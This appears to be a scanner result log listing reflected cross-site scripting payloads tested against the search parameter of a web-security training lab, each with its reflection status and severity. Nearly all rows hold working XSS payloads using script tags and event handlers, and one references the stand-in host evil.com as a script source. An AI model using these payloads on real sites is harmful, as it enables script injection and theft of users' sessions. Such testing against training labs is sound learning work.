+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=month onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=button onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img crossorigin=anonymous src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script crossorigin=anonymous src=x onerror=alert(1)></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<acronym onmouseover=alert(1)>X</acronym>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<font onmouseover=alert(1)>X</font>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
